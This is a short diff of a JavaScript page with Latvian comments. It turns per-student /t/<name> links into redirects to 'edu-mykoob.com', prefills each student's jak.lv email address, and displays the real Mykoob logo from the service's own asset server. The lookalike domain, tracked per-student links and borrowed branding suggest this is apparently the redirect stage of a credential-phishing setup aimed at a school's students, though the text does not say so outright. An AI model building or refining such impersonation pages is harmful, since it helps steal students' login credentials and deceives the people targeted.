@@ -85,16 +85,16 @@ const path = window.location.pathname;
 const parts = path.split('/').filter(p => p.length > 0);
 const student = parts[parts.length - 1] || '';
 
-/* ── Validācija — tikai drošas rakstzīmes ── */
+/* ── Validācija ── */
 const isValid = /^[a-zA-Z0-9._-]{1,64}$/.test(student) && !student.includes('..');
 
-/* ── Ja derīgs /t/<vārds> links → pāradresē ar ?email= parametru ── */
-let target = 'https://edu-mykoob.com/';
+/* ── Ja derīgs /t/<vārds> links → pāradresē uz www ar ?email= ── */
+let target = 'https://www.edu-mykoob.com/';
 if (path.includes('/t/') && isValid && student !== '404' && student !== 'unknown') {
-  target = 'https://edu-mykoob.com/?email=' + encodeURIComponent(student + '@jak.lv');
+  target = 'https://www.edu-mykoob.com/?email=' + encodeURIComponent(student + '@jak.lv');
 }
 
-/* ── Logo maiņa pēc tēmas ── */
+/* ── Logo maiņa ── */
 const isLight = window.matchMedia('(prefers-color-scheme: light)').matches;
 document.getElementById('brandLogo').src = isLight
   ? 'https://web-assets.mykoob.lv/login-frontend/assets/mykoob-logo-dark-DX3tqsaM.png'
